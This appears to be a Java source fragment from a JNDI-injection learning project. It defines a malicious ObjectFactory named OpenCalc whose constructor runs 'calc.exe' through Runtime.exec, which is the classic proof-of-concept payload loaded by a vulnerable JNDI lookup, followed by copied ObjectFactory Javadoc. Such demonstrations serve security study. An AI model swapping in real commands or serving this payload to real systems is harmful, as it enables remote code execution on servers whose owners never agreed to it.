package per.jndi.learning.example.inject.server.undoer;
 ...
 */
public class OpenCalc implements ObjectFactory {

  public OpenCalc() throws IOException {
    System.out.println("[server]准备打开计算器");
    Runtime.getRuntime().exec("calc.exe");
    System.out.println("[server]开启计算器完毕");
  }
   ...
   * successively loads in object factories and invokes this method on them until one produces a
   * non-null answer.  When an exception is thrown by an object factory, the exception is passed on
   * to the caller of <tt>NamingManager.getObjectInstance()</tt> (and no search is made for other
   * factories that may produce a non-null answer). An object factory should only throw an exception
   * if it is sure that it is the only intended factory and that no other object factories should be
   * tried. If this factory cannot create an object using the arguments supplied, it should return
   * null.
   * <p>
   * A <em>URL context factory</em> is a special ObjectFactory that creates contexts for resolving
   * URLs or objects whose locations are specified by URLs.  The <tt>getObjectInstance()</tt> method
